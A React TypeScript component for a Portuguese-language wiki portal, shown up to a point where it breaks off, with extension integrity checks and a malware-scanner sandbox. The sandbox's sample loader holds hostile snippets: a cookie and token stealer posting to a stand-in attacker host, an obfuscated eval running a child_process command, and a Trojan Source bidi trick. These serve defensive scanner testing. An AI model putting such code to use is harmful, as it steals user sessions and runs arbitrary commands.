/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 
 * NotMediaWiki Portal Component
 * Integrated implementation of https://github.com/WazzimaGiygg/NotMediaWiki-Beta-
 * Official domain: https://notmediawiki.wazzimagiygg.com/
 */

import React, { useState, useEffect, useMemo } from 'react';
import {
  WIKI_SITE_VERSION,
  WIKI_SITE_SERIES,
  WIKI_SITE_REVISION,
  WIKI_SITE_DISPLAY_ID,
  WIKI_SITE_ENGINE,
  WIKI_SITE_LICENSE,
} from '../../config/wikiVersion';
import {
  BookOpen,
  Edit3,
  Clock,
  Eye,
  Shield,
  List,
  ArrowRight,
  RefreshCw,
  MessageSquare,
  FileText,
  GitCompare,
  Printer,
  Download,
  FolderTree,
  Database,
  Zap,
  Shuffle,
  ExternalLink,
  Search,
  Plus,
  CheckCircle,
  AlertTriangle,
  FileDown,
  Layers,
  Code,
  Users,
  Compass,
  Settings,
  Sparkles,
  ChevronRight,
  Trash2,
  X,
  Lock,
  Unlock,
  Bug,
  FileCode,
  Terminal,
  AlertOctagon,
  ShieldAlert,
  ShieldCheck,
  Check,
  Cpu,
  Sliders,
  Copy,
  Share2,
  Puzzle,
  UserCheck,
  History,
  Info
} from 'lucide-react';
import jsPDF from 'jspdf';
import ExtensionConfigModal from '../ExtensionConfigModal';
import AddExtensionCatalogModal from '../AddExtensionCatalogModal';
import { exportWikiArticleFormattedPdf } from '../../utils/pdfExport';
import AbntCitationGenerator from '../AbntCitationGenerator';
import { updateSEO } from '../../wiki/utils/seoManager';
import NotMediaWikiInfoboxTutorial from './NotMediaWikiInfoboxTutorial';
import NotMediaWikiLgpdDeletionPanel from './NotMediaWikiLgpdDeletionPanel';
import {
  buildPersonalUserPageSlug,
  buildUserInfoboxWikitext,
  extractUserNotMediaWikiContributions,
  INFOBOX_TUTORIAL_TEMPLATES,
  resolveUserDisplayName
} from '../../config/userInfobox';
import {
  WikiArticle,
  WikiRevision,
  WikiEvent,
  WikiExtension,
  ExtensionFile,
  ExtensionSecurityThreat,
  ExtensionSecurityAudit,
  ALLOWED_EXTENSION_DOMAINS,
  SEED_WIKI_EXTENSIONS,
  EXISTING_EXTENSIONS_CATALOG,
  parseWikitextToHtml,
  computeWikitextDiff,
  computeSha256Hex,
  computeShannonEntropy,
  scanExtensionCodeForMalware,
  verifyExtensionSyncSecurity,
  ParseResult,
  DiffResult
} from '../../data/notMediaWikiData';
import {
  listWikiArticlesFromDb,
  saveWikiArticleInDb,
  deleteWikiArticleFromDb,
  listWikiRevisionsFromDb,
  listWikiEventsFromDb,
  listNotMediaWikiUserPagesFromDb,
  saveNotMediaWikiUserPageToDb,
  ensureUserNotMediaWikiPersonalPage,
  listLocalUserWikiRevisions,
  verifyExtensionIntegrityWithFirestore,
  registerExtensionHashInFirestore,
  executeExtensionSafely,
  loadAndVerifyAllExtensionsFromDb,
  ExtensionIntegrityCheckResult,
  safeApiFetch,
  pushLocalUserNotification
} from '../../firebase';
import { stripHtmlToPlainText } from '../../utils/text';
import HighlightedText from '../HighlightedText';
import {
  validateWikiArticlePayload,
  ArticleValidationError
} from '../../utils/articleSchema';
import { dispatchNewArticlePushNotification } from '../../utils/browserPushManager';
import { AdminExtensionsManagementView } from '../../wiki/components/AdminExtensionsManagementView';
import type { UserProfile as WikiUserProfile } from '../../wiki/types';

type NotMediaWikiInnerTab =
  | 'portal'
  | 'reader'
  | 'editor'
  | 'history'
  | 'events'
  | 'special'
  | 'extensions'
  | 'governance'
  | 'tutorial';

interface NotMediaWikiPortalProps {
  currentUser?: any;
  showToast: (msg: string, isError?: boolean) => void;
  targetSlug?: string | null;
  initialInnerTab?: NotMediaWikiInnerTab;
  onNavigationConsumed?: () => void;
  onOpenUserInfobox?: (uid: string) => void;
  onArticlesSynced?: (articles: WikiArticle[]) => void;
}

export default function NotMediaWikiPortal({
  currentUser,
  showToast,
  targetSlug,
  initialInnerTab,
  onNavigationConsumed,
  onOpenUserInfobox,
  onArticlesSynced
}: NotMediaWikiPortalProps) {
  // Navigation & View States
  const [activeTab, setActiveTab] = useState<NotMediaWikiInnerTab>(initialInnerTab || 'portal');
  const [portalNamespaceFilter, setPortalNamespaceFilter] = useState<'all' | 0 | 1 | 2>('all');

  // Articles & Revisions Data (Strictly from Database)
  const [articles, setArticles] = useState<WikiArticle[]>([]);
  const [revisions, setRevisions] = useState<WikiRevision[]>([]);
  const [events, setEvents] = useState<WikiEvent[]>([]);
  const [extensions, setExtensions] = useState<WikiExtension[]>(SEED_WIKI_EXTENSIONS);
  const [extensionSuiteMode, setExtensionSuiteMode] = useState<'wiki-alternative' | 'classic'>('wiki-alternative');
  const [isLoadingWikiData, setIsLoadingWikiData] = useState<boolean>(true);

  const wikiExtensionUser: WikiUserProfile | null = useMemo(() => {
    if (!currentUser) return null;
    const displayName = currentUser.displayName || currentUser.name || currentUser.email || 'Usuário';
    const isBurocrataUser =
      currentUser.email?.toLowerCase() === 'pedrohenriquecardonaperes@gmail.com' ||
      Boolean(currentUser.isAdmin);
    return {
      uid: currentUser.uid || 'portal-user',
      username: displayName,
      displayName,
      email: currentUser.email || '',
      photoURL: currentUser.photoURL || undefined,
      role: isBurocrataUser ? 'admin' : 'leitor',
      group: isBurocrataUser ? 'burocrata' : 'usuario',
      isGuest: false,
      isBanned: false,
      createdAt: new Date().toISOString(),
      dataCriacao: new Date().toISOString(),
    };
  }, [currentUser]);

  // Active Article in Reader
  const [currentSlug, setCurrentSlug] = useState<string>('');
  const [searchQuery, setSearchQuery] = useState<string>('');

  // Editor States
  const [editorTitle, setEditorTitle] = useState<string>('');
  const [editorWikitext, setEditorWikitext] = useState<string>('');
  const [editorSummary, setEditorSummary] = useState<string>('');
  const [editorIsMinor, setEditorIsMinor] = useState<boolean>(false);
  const [editorTab, setEditorTab] = useState<'split' | 'code' | 'preview'>('split');
  const [isSavingArticle, setIsSavingArticle] = useState<boolean>(false);
  const [editorFieldErrors, setEditorFieldErrors] = useState<Record<string, string>>({});

  // History / Diff States
  const [selectedOldRevId, setSelectedOldRevId] = useState<string>('');
  const [selectedNewRevId, setSelectedNewRevId] = useState<string>('');
  const [diffResult, setDiffResult] = useState<DiffResult | null>(null);

  // PDF Generation State
  const [isExportingPdf, setIsExportingPdf] = useState<boolean>(false);

  // Extension Security & Forensic Analysis States (Dispositivos 3.05.9.a & 3.05.9.b)
  const [isSyncingExtensions, setIsSyncingExtensions] = useState<boolean>(false);
  const [syncFeedback, setSyncFeedback] = useState<{
    success: boolean;
    message: string;
    status?: string;
    reasons?: string[];
    audit?: ExtensionSecurityAudit;
  } | null>(null);
  const [inspectingExtension, setInspectingExtension] = useState<WikiExtension | null>(null);
  const [inspectingFile, setInspectingFile] = useState<ExtensionFile | null>(null);

  // Real-time Forensic Scanner Sandbox States (Dispositivo 3.05.9.b)
  const [forensicFileName, setForensicFileName] = useState<string>('extension_hook.ts');
  const [forensicCode, setForensicCode] = useState<string>(
    `// Exemplo de Extensão NotMediaWiki\nexport function onArticleRender(content: string): string {\n  return content.replace(/NOTICIA_URGENTE/g, '🚨 Plantão Especial WazzimaGiygg');\n}`
  );
  const [forensicAudit, setForensicAudit] = useState<ExtensionSecurityAudit | null>(null);
  const [isScanningForensic, setIsScanningForensic] = useState<boolean>(false);

  const [firestoreIntegrityMap, setFirestoreIntegrityMap] = useState<Record<string, ExtensionIntegrityCheckResult>>({});
  const [executionTestResult, setExecutionTestResult] = useState<{
    success: boolean;
    message: string;
    check?: ExtensionIntegrityCheckResult;
  } | null>(null);

  // Modals for Extension Governance (3.05.3.a, 3.05.3.b, 3.05.3.c, 3.05.3.e)
  const [configModalExt, setConfigModalExt] = useState<WikiExtension | null>(null);
  const [isCatalogModalOpen, setIsCatalogModalOpen] = useState<boolean>(false);

  const isBureaucrat = currentUser?.email?.toLowerCase() === 'pedrohenriquecardonaperes@gmail.com';

  // Verify all extensions with Firestore integrity registry
  const refreshFirestoreIntegrity = async (extList: WikiExtension[]) => {
    try {
      const results: Record<string, ExtensionIntegrityCheckResult> = {};
      for (const ext of extList) {
        const check = await verifyExtensionIntegrityWithFirestore(ext);
        results[ext.id] = check;
      }
      setFirestoreIntegrityMap(results);
    } catch (err) {
      console.warn('Erro ao verificar integridade no Firestore:', err);
    }
  };

  // Load extensions from backend API (with local/Firestore fallback) and verify against Firestore hashes
  const loadExtensionsFromApi = async () => {
    try {
      const res = await safeApiFetch('/api/v1/extensions');
      if (res && res.ok) {
        const data = await res.json();
        if (data.extensions && Array.isArray(data.extensions)) {
          setExtensions(data.extensions);
          refreshFirestoreIntegrity(data.extensions);
          return;
        }
      }

      // Static mode fallback: localStorage -> SEED_WIKI_EXTENSIONS
      let fallbackList = [...SEED_WIKI_EXTENSIONS];
      try {
        const cached = localStorage.getItem('wzzm_extensions_state');
        if (cached) {
          const parsed = JSON.parse(cached);
          if (Array.isArray(parsed) && parsed.length > 0) {
            fallbackList = parsed;
          }
        }
      } catch {}
      setExtensions(fallbackList);
      refreshFirestoreIntegrity(fallbackList);
    } catch (err) {
      console.warn('Erro ao carregar extensões:', err);
    }
  };

  useEffect(() => {
    loadExtensionsFromApi();
  }, []);

  // Synchronize all extensions with security device & Firestore Registry
  const handleSyncAllExtensions = async () => {
    if (!isBureaucrat) {
      showToast('Apenas o Burocrata oficial (pedrohenriquecardonaperes@gmail.com) tem permissão para sincronizar extensões.', true);
      return;
    }

    setIsSyncingExtensions(true);
    setSyncFeedback(null);
    let successCount = 0;
    let quarantinedCount = 0;
    const errors: string[] = [];

    try {
      for (const ext of extensions) {
        // 1. Sync with backend gateway if available
        const res = await safeApiFetch('/api/v1/extensions/security/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            extension: ext,
            userEmail: currentUser?.email
          })
        });

        // 2. Register authorized hash in Firestore
        await registerExtensionHashInFirestore(ext, currentUser?.email);

        // 3. Verify downloaded integrity against Firestore record
        const integrityCheck = await verifyExtensionIntegrityWithFirestore(ext);

        const data = res ? await res.json().catch(() => ({})) : { success: true, status: 'verified', reasons: [] };
        if (data.success && integrityCheck.valid) {
          successCount++;
        } else {
          if (data.status === 'quarantined' || integrityCheck.status === 'quarantined') quarantinedCount++;
          if (integrityCheck.errors.length > 0) {
            errors.push(`${ext.name}: ${integrityCheck.errors.join('; ')}`);
          } else if (data.reasons && data.reasons.length > 0) {
            errors.push(`${ext.name}: ${data.reasons.join('; ')}`);
          } else if (data.error) {
            errors.push(`${ext.name}: ${data.error}`);
          }
        }
      }

      await loadExtensionsFromApi();

      if (errors.length === 0) {
        setSyncFeedback({
          success: true,
          message: `Sincronia criptográfica e hashes no Firestore validados com sucesso! ${successCount} extensões assinadas por ${currentUser?.email}.`
        });
        showToast('Extensões sincronizadas e validadas com hashes no Firestore.');
      } else {
        setSyncFeedback({
          success: false,
          message: `Sincronia concluída com alertas: ${successCount} íntegras no Firestore, ${quarantinedCount} em quarentena preventiva.`,
          reasons: errors
        });
        showToast('Sincronia de extensões processada com quarentena/alertas.', true);
      }
    } catch (err: any) {
      setSyncFeedback({
        success: false,
        message: `Falha de comunicação com o gateway de segurança: ${err.message}`
      });
      showToast('Erro ao sincronizar extensões com o Firestore.', true);
    } finally {
      setIsSyncingExtensions(false);
    }
  };

  // Toggle extension state (Guarded by Bureaucrat, Quarantine & Firestore Hash Integrity)
  const handleToggleExtension = async (ext: WikiExtension) => {
    if (!isBureaucrat) {
      showToast('Apenas o Burocrata oficial (pedrohenriquecardonaperes@gmail.com) pode ativar ou desativar extensões.', true);
      return;
    }

    if (ext.quarantined && !ext.enabled) {
      showToast('BLOQUEIO: Esta extensão está em QUARENTENA preventiva e não pode ser ativada.', true);
      return;
    }

    // Verify integrity against Firestore BEFORE execution/activation
    const integrity = await verifyExtensionIntegrityWithFirestore(ext);
    if (!ext.enabled && (!integrity.canExecute || !integrity.valid)) {
      showToast(
        `BLOQUEIO DE INTEGRIDADE: A extensão falhou na validação de hash com o Firestore (${integrity.status}). ${integrity.errors[0] || ''}`,
        true
      );
      return;
    }

    try {
      const res = await safeApiFetch(`/api/v1/extensions/${ext.id}/toggle`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          enabled: !ext.enabled,
          userEmail: currentUser?.email
        })
      });

      if (res && !res.ok) {
        const data = await res.json().catch(() => ({}));
        showToast(data.error || 'Erro ao alterar estado da extensão.', true);
        return;
      }

      setExtensions((prev) => {
        const updated = prev.map((e) => (e.id === ext.id ? { ...e, enabled: !ext.enabled } : e));
        try {
          localStorage.setItem('wzzm_extensions_state', JSON.stringify(updated));
        } catch {}
        return updated;
      });
      showToast(`Extensão "${ext.name}" ${!ext.enabled ? 'ativada' : 'desativada'} com sucesso.`);
    } catch (err: any) {
      showToast(`Erro na requisição: ${err.message}`, true);
    }
  };

  // 3.05.3.a, 3.05.3.b, 3.05.3.c, 3.05.3.e: Save Extension Configuration & Code
  const handleSaveExtensionConfig = async (
    extensionId: string,
    newConfig: Record<string, any>,
    updatedMetadata?: Partial<WikiExtension>
  ): Promise<boolean> => {
    try {
      const res = await safeApiFetch(`/api/v1/extensions/${extensionId}/config`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          config: newConfig,
          userEmail: currentUser?.email
        })
      });

      let updatedExt: WikiExtension | undefined;
      if (res) {
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
          showToast(data.error || 'Erro ao salvar configuração da extensão.', true);
          return false;
        }
        updatedExt = data.extension;

        // If metadata or files were also modified, send PUT /api/v1/extensions/:id
        if (updatedMetadata && (updatedMetadata.namePt || updatedMetadata.description || updatedMetadata.files)) {
          await safeApiFetch(`/api/v1/extensions/${extensionId}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              ...updatedMetadata,
              config: newConfig,
              userEmail: currentUser?.email
            })
          });
        }
      }

      // Update local state & static storage
      let nextExtensions: WikiExtension[] = [];
      setExtensions((prev) => {
        nextExtensions = prev.map((e) =>
          e.id === extensionId
            ? { ...e, ...updatedMetadata, config: { ...(e.config || {}), ...newConfig } }
            : e
        );
        try {
          localStorage.setItem('wzzm_extensions_state', JSON.stringify(nextExtensions));
        } catch {}
        return nextExtensions;
      });

      const resolvedExt = updatedExt || nextExtensions.find((e) => e.id === extensionId) || extensions.find((e) => e.id === extensionId);
      if (resolvedExt) {
        await registerExtensionHashInFirestore(resolvedExt);
        await refreshFirestoreIntegrity(nextExtensions.length > 0 ? nextExtensions : extensions);
      }

      showToast(`Configurações da extensão "${resolvedExt?.name || extensionId}" salvas com sucesso!`);
      return true;
    } catch (err: any) {
      showToast(`Erro na requisição: ${err.message}`, true);
      return false;
    }
  };

  // 3.05.3.a: Add Extension from Existing Catalog
  const handleAddCatalogExtension = async (catalogExtensionId: string): Promise<boolean> => {
    try {
      const res = await safeApiFetch('/api/v1/extensions/catalog/add', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          catalogExtensionId,
          userEmail: currentUser?.email
        })
      });

      let added: WikiExtension | undefined;
      if (res) {
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
          showToast(data.error || 'Erro ao adicionar extensão do catálogo.', true);
          return false;
        }
        added = data.extension;
      } else {
        added = EXISTING_EXTENSIONS_CATALOG.find((c) => c.id === catalogExtensionId);
      }

      if (!added) {
        showToast('Extensão não encontrada no catálogo.', true);
        return false;
      }

      const addedExt: WikiExtension = added;
      setExtensions((prev) => {
        const next = prev.some((e) => e.id === addedExt.id) ? prev : [...prev, addedExt];
        try {
          localStorage.setItem('wzzm_extensions_state', JSON.stringify(next));
        } catch {}
        return next;
      });
      await registerExtensionHashInFirestore(addedExt);
      await refreshFirestoreIntegrity([...extensions, addedExt]);

      showToast(`✓ Extensão "${addedExt.name}" adicionada ao ecossistema com sucesso!`);
      return true;
    } catch (err: any) {
      showToast(`Erro ao adicionar extensão: ${err.message}`, true);
      return false;
    }
  };

  // 3.05.3.a: Add Custom Extension
  const handleAddCustomExtension = async (customExt: Partial<WikiExtension>): Promise<boolean> => {
    try {
      const res = await safeApiFetch('/api/v1/extensions/catalog/add', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customExtension: customExt,
          userEmail: currentUser?.email
        })
      });

      let added: WikiExtension;
      if (res) {
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) {
          showToast(data.error || 'Erro ao criar extensão.', true);
          return false;
        }
        added = data.extension;
      } else {
        const rawCode = customExt.files?.[0]?.content || '// Custom extension';
        added = {
          id: customExt.id || `ext-custom-${Date.now()}`,
          name: customExt.name || 'CustomExtension',
          namePt: customExt.namePt || customExt.name || 'Extensão Personalizada',
          version: customExt.version || '1.0.0',
          author: customExt.author || currentUser?.email || 'Burocrata',
          description: customExt.description || '',
          category: customExt.category || 'portal',
          enabled: false,
          type: customExt.type || 'extension',
          url: customExt.url || 'https://notmediawiki.wazzimagiygg.com',
          originDomain: customExt.originDomain || 'notmediawiki.wazzimagiygg.com',
          files: customExt.files || [],
          sha256: computeSha256Hex(rawCode),
          signatureStatus: 'verified',
          lastSyncTimestamp: new Date().toISOString(),
          syncAuthorizedBy: currentUser?.email || 'system',
          quarantined: false
        };
      }

      setExtensions((prev) => {
        const next = [...prev, added];
        try {
          localStorage.setItem('wzzm_extensions_state', JSON.stringify(next));
        } catch {}
        return next;
      });
      await registerExtensionHashInFirestore(added);
      await refreshFirestoreIntegrity([...extensions, added]);

      showToast(`✓ Extensão personalizada "${added.name}" registrada com sucesso!`);
      return true;
    } catch (err: any) {
      showToast(`Erro ao criar extensão: ${err.message}`, true);
      return false;
    }
  };

  // Safe Execution Sandbox Simulator with Firestore Integrity Validation
  const handleTestSafeExecution = async (ext: WikiExtension) => {
    setExecutionTestResult(null);
    const testRun = await executeExtensionSafely(ext, () => {
      return `Módulo [${ext.namePt}] executado com sucesso: validação de hash e assinatura no Firestore confirmada!`;
    });

    if (testRun.success) {
      setExecutionTestResult({
        success: true,
        message: testRun.result || 'Execução autorizada pelo Firestore!',
        check: testRun.integrity
      });
      showToast('Assinatura e hash validados no Firestore! Execução autorizada.');
    } else {
      setExecutionTestResult({
        success: false,
        message: testRun.error || 'Execução abortada por falha de integridade no Firestore.',
        check: testRun.integrity
      });
      showToast('Execução bloqueada por divergência de hash no Firestore.', true);
    }
  };

  // Run Forensic Malware Scan (Dispositivo 3.05.9.b)
  const handleRunForensicScan = async () => {
    if (!forensicCode.trim()) {
      showToast('Insira código para verificação antimalware.', true);
      return;
    }

    setIsScanningForensic(true);
    try {
      const localAudit = scanExtensionCodeForMalware('custom-sandbox', forensicFileName, forensicCode);
      setForensicAudit(localAudit);

      // Also submit to backend when available
      const res = await safeApiFetch('/api/v1/extensions/security/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fileName: forensicFileName,
          code: forensicCode
        })
      });

      if (res && res.ok) {
        const data = await res.json();
        if (data.audit) {
          setForensicAudit(data.audit);
        }
      }

      if (localAudit.threatLevel === 'CRITICAL' || localAudit.quarantined) {
        showToast('ALERTA: Código classificado como CRÍTICO! Quarentena preventiva disparada.', true);
      } else if (localAudit.threatLevel === 'MEDIUM_RISK' || localAudit.threatLevel === 'LOW_RISK') {
        showToast('Avisos de segurança encontrados no código examinado.');
      } else {
        showToast('Código auditado: 100% íntegro e em conformidade.');
      }
    } catch (err: any) {
      showToast(`Erro no analisador forense: ${err.message}`, true);
    } finally {
      setIsScanningForensic(false);
    }
  };

  // Forensic Sample Payloads
  const loadForensicSample = (sampleType: 'safe' | 'exfil' | 'rce' | 'trojan') => {
    if (sampleType === 'safe') {
      setForensicFileName('clean_parser_hook.ts');
      setForensicCode(`// Extensão Legítima NotMediaWiki\n// Autor: WazzimaGiygg Research\nexport function registerCustomWikitextTag(tag: string, handler: (content: string) => string) {\n  const tagRegistry = new Map<string, (c: string) => string>();\n  tagRegistry.set(tag, handler);\n  return {\n    success: true,\n    tagCount: tagRegistry.size\n  };\n}`);
    } else if (sampleType === 'exfil') {
      setForensicFileName('malicious_stealer.ts');
      setForensicCode(`// AMEACA: Exfiltração de Credenciais & Tokens de Sessão\nfunction stealUserSession() {\n  const userToken = localStorage.getItem('auth_token') || document.cookie;\n  fetch('https://evil-hacker-tracker.xyz/exfiltrate', {\n    method: 'POST',\n    body: JSON.stringify({ token: userToken, target: 'pedrohenriquecardonaperes@gmail.com' })\n  });\n}`);
    } else if (sampleType === 'rce') {
      setForensicFileName('rce_obfuscated_eval.ts');
      setForensicCode(`// AMEACA: Execução Dinâmica Proibida & Sequência Hex Ofuscada\nconst _0x1a2b = "\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73";\nconst dynamicExec = new Function("cmd", "eval(cmd)");\ndynamicExec("require('child_process').execSync('id')");`);
    } else if (sampleType === 'trojan') {
      setForensicFileName('trojan_source_bidi.ts');
      // Contains Trojan Source Bidi Unicode character
      setForensicCode(`// AMEACA: Trojan Source Bidi Override (CVE-2021-42574)\nconst isAuthorized = false; /*\u202E } \u2066if (isAuthorized)\u2069 \u2066*/\nconsole.log("Acesso concedido indevidamente!");`);
    }
  };

  // Load articles, personal user pages (Namespace 2), revisions & events from Firestore & Backend
  useEffect(() => {
    let isMounted = true;
    const loadAllWikiDbData = async () => {
      setIsLoadingWikiData(true);
      try {
        const [dbArticles, dbUserPages, dbRevisions, dbEvents] = await Promise.all([
          listWikiArticlesFromDb(),
          listNotMediaWikiUserPagesFromDb(),
          listWikiRevisionsFromDb(),
          listWikiEventsFromDb()
        ]);

        let ensuredPage: WikiArticle | null = null;
        if (currentUser?.uid) {
          const ensured = await ensureUserNotMediaWikiPersonalPage(
            currentUser,
            Boolean(currentUser.isGuest)
          ).catch(() => null);
          if (ensured?.userPage) {
            ensuredPage = ensured.userPage;
          }
        }

        if (!isMounted) return;

        // Merge main articles + personal user pages cleanly without duplicate slugs
        const articleBySlug = new Map<string, WikiArticle>();
        for (const a of dbArticles || []) {
          if (a?.slug) articleBySlug.set(a.slug.toLowerCase(), a);
        }
        for (const up of dbUserPages || []) {
          if (up?.slug) articleBySlug.set(up.slug.toLowerCase(), up);
        }
        if (ensuredPage?.slug) {
          articleBySlug.set(ensuredPage.slug.toLowerCase(), ensuredPage);
        }
        const mergedArticles = Array.from(articleBySlug.values());

        // Merge backend/Firestore revisions + cached personal user page revisions
        const localUserRevs = listLocalUserWikiRevisions();
        const revById = new Map<string, WikiRevision>();
        for (const r of [...localUserRevs, ...(dbRevisions || [])]) {
          if (r?.id && !revById.has(r.id)) {
            revById.set(r.id, r);
          }
        }
        const mergedRevs = Array.from(revById.values()).sort(
          (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );

        setArticles(mergedArticles);
        onArticlesSynced?.(mergedArticles);
        setRevisions(mergedRevs);
        setEvents(dbEvents || []);

        if (targetSlug) {
          setCurrentSlug(targetSlug);
        } else if (mergedArticles.length > 0) {
          setCurrentSlug((prev) => prev || mergedArticles[0].slug);
        }
      } catch (err) {
        console.warn('Erro ao sincronizar NotWikiPedia com banco de dados:', err);
      } finally {
        if (isMounted) setIsLoadingWikiData(false);
      }
    };
    loadAllWikiDbData();
    return () => {
      isMounted = false;
    };
  }, [currentUser?.uid]);

  // Synchronize external navigation requests (e.g. from First-Login Banner or UserProfileModal)
  useEffect(() => {
    if (!targetSlug && !initialInnerTab) return;
    if (targetSlug) {
      setCurrentSlug(targetSlug);
      if (!initialInnerTab) {
        setActiveTab('reader');
      }
    }
    if (initialInnerTab) {
      setActiveTab(initialInnerTab);
    }
    onNavigationConsumed?.();
  }, [targetSlug, initialInnerTab]);

  // Active logged-in user's personal NotMediaWiki page
  const myPersonalUserPage = useMemo(() => {
    if (!currentUser?.uid) return null;
    return (
      articles.find(
        (a) =>
          (a.ownerUid && a.ownerUid === currentUser.uid) ||
          (a.namespace === 2 &&
            a.slug.toLowerCase() ===
              buildPersonalUserPageSlug(resolveUserDisplayName(currentUser), currentUser.uid).toLowerCase())
      ) || null
    );
  }, [articles, currentUser]);

  const myContributionsCount = useMemo(() => {
    if (!currentUser?.uid) return 0;
    return extractUserNotMediaWikiContributions(
      {
        uid: currentUser.uid,
        name: currentUser.name,
        displayName: currentUser.displayName,
        email: currentUser.email,
        slug: myPersonalUserPage?.slug
      },
      articles,
      revisions,
      events
    ).length;
  }, [currentUser, myPersonalUserPage, articles, revisions, events]);

  // Currently active article object
  const currentArticle = useMemo(() => {
    if (!articles || articles.length === 0) return null;
    if (!currentSlug) return articles[0];
    return articles.find((a) => a.slug.toLowerCase() === currentSlug.toLowerCase()) || null;
  }, [articles, currentSlug]);

  // Contributions for whichever Namespace 2 Personal User Page is currently open
  const viewedUserContributions = useMemo(() => {
    if (!currentArticle) return [];
    const isUserPage =
      currentArticle.namespace === 2 ||
      currentArticle.isPersonalUserPage ||
      currentArticle.slug.toLowerCase().startsWith('usuário:');
    if (!isUserPage) return [];

    const inferredName = (currentArticle as any).ownerName || currentArticle.title.replace(/^Usuário:/i, '');
    return extractUserNotMediaWikiContributions(
      {
        uid: currentArticle.ownerUid,
        name: inferredName,
        displayName: inferredName,
        email: currentArticle.ownerEmail,
        slug: currentArticle.slug
      },
      articles,
      revisions,
      events
    );
  }, [currentArticle, articles, revisions, events]);

  // Compiled Parsoid AST Result for active article
  const parseResult: ParseResult = useMemo(() => {
    if (!currentArticle) {
      return {
        html: '',
        toc: [],
        categories: [],
        internalLinks: [],
        externalLinks: [],
        references: [],
        parseTimeMs: 0
      };
    }
    return parseWikitextToHtml(currentArticle.wikitext, currentArticle.title);
  }, [currentArticle]);

  // Synchronize dynamic canonical & meta tags for NotMediaWiki articles
  useEffect(() => {
    if (activeTab === 'reader' && currentArticle) {
      updateSEO({
        view: 'article',
        article: {
          id: currentArticle.id || currentArticle.slug,
          pageUid: currentArticle.slug || currentArticle.id,
          titulo: currentArticle.title,
          descricao: currentArticle.summary || currentArticle.wikitext,
          resumo: currentArticle.summary,
          categoria: currentArticle.categories?.[0] || 'NotMediaWiki',
          idioma: 'pt-BR',
          dataCriacao: currentArticle.createdAt,
          dataEdicao: currentArticle.updatedAt,
          autor: 'Comunidade NotMediaWiki (core.wazzimagiygg.com)',
        },
      });
    } else if (activeTab === 'editor') {
      updateSEO({ view: 'editor' });
    } else if (activeTab === 'history' || activeTab === 'events') {
      updateSEO({ view: 'recent-changes' });
    } else {
      updateSEO({
        view: 'hub',
        canonicalPath: '/?uid=notmediawiki',
      });
    }
  }, [activeTab, currentArticle]);

  // Active article revisions
  const articleRevisions = useMemo(() => {
    return revisions
      .filter((r) => r.articleSlug.toLowerCase() === currentSlug.toLowerCase())
      .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
  }, [revisions, currentSlug]);

  // Setup initial diff selections
  useEffect(() => {
    if (articleRevisions.length >= 2) {
      setSelectedOldRevId(articleRevisions[1].id);
      setSelectedNewRevId(articleRevisions[0].id);
    } else if (articleRevisions.length === 1) {
      setSelectedOldRevId(articleRevisions[0].id);
      setSelectedNewRevId(articleRevisions[0].id);
    }
  }, [articleRevisions]);

  // Compute diff when revisions change
  useEffect(() => {
    if (selectedOldRevId && selectedNewRevId) {
      const oldRev = revisions.find((r) => r.id === selectedOldRevId);
      const newRev = revisions.find((r) => r.id === selectedNewRevId);
      if (oldRev && newRev) {
        const diff = computeWikitextDiff(oldRev.wikitext, newRev.wikitext, oldRev.id, newRev.id);
        setDiffResult(diff);
      }
    }
  }, [selectedOldRevId, selectedNewRevId, revisions]);

  // Pick and open a random article inside NotMediaWiki (prioritizes Namespace 0 encyclopedia articles)
  const handleOpenRandomArticle = () => {
    if (articles.length === 0) {
      showToast('Nenhum artigo cadastrado no banco de dados para sorteio.', true);
      return;
    }

    const encyclopediaPool = articles.filter(
      (a) =>
        a.namespace === 0 &&
        !a.isPersonalUserPage &&
        !a.slug.toLowerCase().startsWith('usuário:') &&
        !a.slug.toLowerCase().startsWith('usuario:')
    );

    const basePool = encyclopediaPool.length > 0 ? encyclopediaPool : articles;
    const currentNormalized = (currentSlug || '').toLowerCase();
    const differentInBase = basePool.filter((a) => a.slug.toLowerCase() !== currentNormalized);
    const differentInAll = articles.filter((a) => a.slug.toLowerCase() !== currentNormalized);

    const candidates =
      differentInBase.length > 0
        ? differentInBase
        : differentInAll.length > 0
          ? differentInAll
          : basePool;

    const chosen = candidates[Math.floor(Math.random() * candidates.length)];
    setCurrentSlug(chosen.slug);
    setActiveTab('reader');
    window.scrollTo({ top: 0, behavior: 'smooth' });
    showToast(`Artigo aleatório: "${chosen.title}"`);
  };

  // Internal link handler
  const handleNavigateSlug = (slug: string) => {
    const formatted = slug.replace(/^wiki\//, '').replace(/\s+/g, '_');
    const normalized = formatted.toLowerCase();
    if (
      normalized === 'special:random' ||
      normalized === 'especial:aleatório' ||
      normalized === 'especial:aleatorio' ||
      normalized === 'artigo_aleatório' ||
      normalized === 'artigo_aleatorio'
    ) {
      handleOpenRandomArticle();
      return;
    }

    const target = articles.find((a) => a.slug.toLowerCase() === normalized);
    if (target) {
      setCurrentSlug(target.slug);
      setActiveTab('reader');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } else {
      showToast(`Página "${formatted}" não encontrada no acervo.`, true);
    }
  };

  // Open Editor for current article
  const handleOpenEditor = (articleToEdit?: WikiArticle) => {
    const target = articleToEdit || currentArticle;
    if (target) {
      setEditorTitle(target.title);
      setEditorWikitext(target.wikitext);
      setEditorSummary(`Edição em ${target.title}`);
      setEditorFieldErrors({});
      setActiveTab('editor');
    }
  };

  // Open New Article Form
